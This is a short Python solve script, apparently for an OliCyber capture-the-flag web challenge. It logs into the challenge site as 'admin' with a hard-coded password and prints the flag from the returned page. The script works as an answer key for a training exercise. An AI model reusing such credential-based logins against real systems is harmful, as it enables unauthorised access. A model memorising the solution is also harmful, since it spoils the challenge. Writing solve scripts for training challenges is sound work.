import requests

URL = "http://gabibboinnovazione.challs.olicyber.it"

s = requests.session()
r = s.post(URL + "/login", data={"username": "admin", "password": "tkdF^cZFFaAD3!dTEQ7n"})
r = s.get(URL).text

for line in r.splitlines():
    if "flag{" in line.lower():
        print("flag:\n", line)
